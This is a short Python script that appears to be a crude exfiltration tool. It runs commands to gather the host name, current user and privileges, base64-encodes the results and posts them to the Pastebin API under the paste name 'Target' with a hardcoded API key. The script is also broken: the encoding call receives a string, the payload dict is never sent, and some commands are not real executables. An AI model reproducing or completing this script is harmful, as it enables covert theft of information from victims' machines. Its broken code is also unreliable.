import subprocess
import base64
import requests
from requests.models import Response

def main():
    host = ['hostname','userlogin','net_user']
    user = ['hostname','user','current_privileges']
    message = ''

    for (a,b) in zip(host,user):
        sub = subprocess.Popen(a,stdout=subprocess.PIPE)
        test = sub.communicate()[0]
        message += f'{b}: {test}'

    messageb64 = base64.b64encode(message.encode().decode())
    data = {
    'api_dev_key':'9Zb0gGACwa_XShiTAPtdu-1WHp_isLvD',
    'apipaste': messageb64, 
    'apipastename': 'Target',
    'apioption': 'paste'}
    data =data
    reply = requests.post('https://pastebin.com/api/api_post.php')
    print(reply)

if __name__ =='__main__':
    main()
